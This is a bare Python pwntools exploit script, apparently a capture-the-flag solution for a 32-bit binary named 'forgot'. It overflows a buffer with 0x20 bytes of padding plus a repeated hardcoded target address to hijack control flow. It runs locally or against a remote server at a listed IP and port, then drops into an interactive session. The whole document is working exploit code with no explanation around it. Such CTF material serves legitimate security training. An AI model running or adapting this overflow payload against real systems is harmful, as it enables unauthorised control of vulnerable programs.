from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if len(sys.argv) < 2:
	p = process("./forgot")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./forgot")
else:
	p = remote("111.198.29.45",31469)
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./forgot")

def debugf():
	gdb.attach(p,"b *0x08048A5D\nb *0x8048702\nb fgets")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
target = 0x080486CC
p.sendlineafter("> ","a")
payload = "a"*0x20 + p32(target)*10
p.sendlineafter("> ",payload)
p.interactive()
